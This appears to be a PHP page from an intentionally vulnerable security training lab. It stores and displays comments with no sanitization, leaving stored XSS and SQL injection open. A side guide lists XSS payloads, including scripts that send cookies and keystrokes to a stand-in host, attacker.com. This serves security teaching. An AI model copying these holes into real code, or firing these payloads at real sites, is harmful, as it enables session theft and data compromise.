<?php
require_once 'config.php';

$conn = getConnection();
$success = '';
$error = '';

// Handle new comment submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $comment = $_POST['comment'] ?? '';
    $user_id = $_SESSION['user_id'] ?? 1;
    
    // VULNERABLE: No input sanitization - Stored XSS possible
    // The comment is stored directly in the database
    $sql = "INSERT INTO comments (user_id, comment) VALUES ($user_id, '$comment')";
    
    if ($conn->query($sql)) {
        $success = "Comment posted successfully!";
    } else {
        $error = "Failed to post comment: " . $conn->error;
    }
}

// Fetch all comments
$comments = [];
$sql = "SELECT c.*, u.username FROM comments c LEFT JOIN users u ON c.user_id = u.id ORDER BY c.created_at DESC";
$result = $conn->query($sql);

if ($result) {
    while ($row = $result->fetch_assoc()) {
        $comments[] = $row;
    }
}

$conn->close();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Comments - Security Testing Lab</title>
    <link rel="stylesheet" href="assets/css/style.css">
</head>
<body>
    <nav class="navbar">
        <div class="nav-container">
            <a href="index.php" class="logo">SecLab</a>
            <div class="nav-links">
                <a href="index.php" class="nav-link">Home</a>
                <a href="login.php" class="nav-link">Login</a>
                <a href="search.php" class="nav-link">Search</a>
                <a href="products.php" class="nav-link">Products</a>
                <a href="profile.php" class="nav-link">Profile</a>
                <a href="comments.php" class="nav-link active">Comments</a>
                <a href="upload.php" class="nav-link">Upload</a>
                <a href="admin.php" class="nav-link">Admin</a>
                <a href="api.php" class="nav-link">API</a>
                <a href="decoder.php" class="nav-link">Decoder</a>
            </div>
        </div>
    </nav>

    <div class="container">
        <div class="grid grid-2">
            <div class="card">
                <div class="card-header">
                    <div class="card-icon">💬</div>
                    <div>
                        <div class="card-title">Community Comments</div>
                        <div class="card-subtitle">Share your thoughts</div>
                    </div>
                </div>

                <?php if ($success): ?>
                    <div class="alert alert-success">✅ <?php echo $success; ?></div>
                <?php endif; ?>

                <?php if ($error): ?>
                    <div class="alert alert-error">❌ <?php echo $error; ?></div>
                <?php endif; ?>

                <form method="POST" action="comments.php">
                    <div class="form-group">
                        <label class="form-label">Your Comment</label>
                        <textarea name="comment" class="form-textarea" placeholder="Write your comment here..." required></textarea>
                    </div>
                    <button type="submit" class="btn btn-primary">Post Comment</button>
                </form>

                <div style="margin-top: 2rem;">
                    <h4 style="color: var(--accent-primary); margin-bottom: 1rem;">Recent Comments</h4>
                    
                    <?php if (count($comments) > 0): ?>
                        <?php foreach ($comments as $comment): ?>
                            <div style="background: var(--bg-secondary); border: 1px solid var(--border-color); border-radius: 12px; padding: 1rem; margin-bottom: 1rem;">
                                <div style="display: flex; justify-content: space-between; margin-bottom: 0.5rem;">
                                    <strong style="color: var(--accent-secondary);">
                                        <?php echo htmlspecialchars($comment['username'] ?? 'Anonymous'); ?>
                                    </strong>
                                    <span style="color: var(--text-muted); font-size: 0.85rem;">
                                        <?php echo $comment['created_at']; ?>
                                    </span>
                                </div>
                                <!-- VULNERABLE: Stored XSS - comment displayed without sanitization -->
                                <p style="color: var(--text-primary);"><?php echo $comment['comment']; ?></p>
                            </div>
                        <?php endforeach; ?>
                    <?php else: ?>
                        <p style="color: var(--text-muted);">No comments yet. Be the first to comment!</p>
                    <?php endif; ?>
                </div>
            </div>

            <div class="card">
                <div class="card-header">
                    <div class="card-icon">📝</div>
                    <div>
                        <div class="card-title">XSS Testing Guide</div>
                        <div class="card-subtitle">Stored Cross-Site Scripting</div>
                    </div>
                </div>

                <h4 style="color: var(--accent-primary); margin-bottom: 1rem;">💉 Basic XSS Payloads</h4>
                <div class="code-block">
&lt;script&gt;alert('XSS')&lt;/script&gt;
&lt;script&gt;alert(document.domain)&lt;/script&gt;
&lt;script&gt;alert(document.cookie)&lt;/script&gt;
                </div>

                <h4 style="color: var(--accent-primary); margin: 1.5rem 0 1rem;">🖼️ Image-Based XSS</h4>
                <div class="code-block">
&lt;img src=x onerror=alert('XSS')&gt;
&lt;img src="javascript:alert('XSS')"&gt;
&lt;img src=x onmouseover=alert('XSS')&gt;
                </div>

                <h4 style="color: var(--accent-primary); margin: 1.5rem 0 1rem;">🎨 SVG & HTML5 XSS</h4>
                <div class="code-block">
&lt;svg onload=alert('XSS')&gt;
&lt;body onload=alert('XSS')&gt;
&lt;video&gt;&lt;source onerror=alert('XSS')&gt;
&lt;details open ontoggle=alert('XSS')&gt;
                </div>

                <h4 style="color: var(--accent-primary); margin: 1.5rem 0 1rem;">🍪 Cookie Stealing</h4>
                <div class="code-block">
&lt;script&gt;
new Image().src="http://attacker.com/steal?c="+document.cookie;
&lt;/script&gt;

&lt;script&gt;
fetch('http://attacker.com/log?c='+document.cookie);
&lt;/script&gt;
                </div>

                <h4 style="color: var(--accent-primary); margin: 1.5rem 0 1rem;">🔄 Keylogger</h4>
                <div class="code-block">
&lt;script&gt;
document.onkeypress=function(e){
  new Image().src="http://attacker.com/log?k="+e.key;
}
&lt;/script&gt;
                </div>

                <div class="alert alert-warning" style="margin-top: 1.5rem;">
                    ⚠️ <strong>Note:</strong> Comments are stored in database and rendered without sanitization. All visitors will see your XSS payload!
                </div>

                <div class="alert alert-info" style="margin-top: 1rem;">
                    💡 <strong>Tip:</strong> Use Burp Suite to intercept the POST request and modify the comment payload before it's sent.
                </div>
            </div>
        </div>
    </div>
</body>
</html>

